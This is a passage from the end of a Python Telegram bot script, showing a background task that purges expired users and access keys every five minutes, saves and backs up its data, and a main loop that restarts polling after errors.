    threading.Thread(target=live_stats_update, args=(message.chat.id, message_sent.message_id), daemon=True).start()
    log_action(user_id, username, "/stats", "", "Live stats dashboard started")

# Periodic cleanup task
def cleanup_expired_data():
    while True:
        try:
            current_time = datetime.datetime.now(IST)
            
            # Clean up expired users
            for uid in list(users.keys()):
                try:
                    exp_date = datetime.datetime.strptime(users[uid]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    if current_time > exp_date:
                        del users[uid]
                        stats["expired_keys"] += 1
                        log_action("SYSTEM", "SYSTEM", "Cleanup", f"Removed expired user: {uid}", "User access expired")
                except (ValueError, KeyError):
                    del users[uid]
                    log_action("SYSTEM", "SYSTEM", "Cleanup", f"Removed invalid user data: {uid}", "Invalid user data")

            # Clean up expired authorized users
            for uid in list(authorized_users.keys()):
                try:
                    exp_date = datetime.datetime.strptime(authorized_users[uid]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    if current_time > exp_date:
                        del authorized_users[uid]
                        stats["expired_keys"] += 1
                        log_action("SYSTEM", "SYSTEM", "Cleanup", f"Removed expired authorized user: {uid}", "Authorized user access expired")
                except (ValueError, KeyError):
                    del authorized_users[uid]
                    log_action("SYSTEM", "SYSTEM", "Cleanup", f"Removed invalid authorized user data: {uid}", "Invalid authorized user data")

            # Clean up expired keys
            for key_name in list(keys.keys()):
                try:
                    key_info = keys[key_name]
                    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    minutes, hours, days, months = parse_duration(key_info["duration"])
                    expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
                    if current_time > expiration_time and not key_info.get("blocked", False):
                        del keys[key_name]
                        stats["expired_keys"] += 1
                        log_action("SYSTEM", "SYSTEM", "Cleanup", f"Removed expired key: {key_name}", "Key expired")
                except (ValueError, KeyError):
                    del keys[key_name]
                    log_action("SYSTEM", "SYSTEM", "Cleanup", f"Removed invalid key data: {key_name}", "Invalid key data")

            save_data()
            create_backup()
            time.sleep(300)  # Run cleanup every 5 minutes
        except Exception as e:
            log_error(f"Cleanup error: {str(e)}", "system", "system")
            time.sleep(300)

# Start the bot
def main():
    load_data()
    print("Bot started successfully! 🚀")
    log_action("SYSTEM", "SYSTEM", "Bot Start", "", "Bot started successfully")

    # Start the cleanup thread
    threading.Thread(target=cleanup_expired_data, daemon=True).start()

    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            log_error(f"Polling error: {str(e)}", "system", "system")
            time.sleep(5)  # Wait before restarting polling

if __name__ == "__main__":
    main()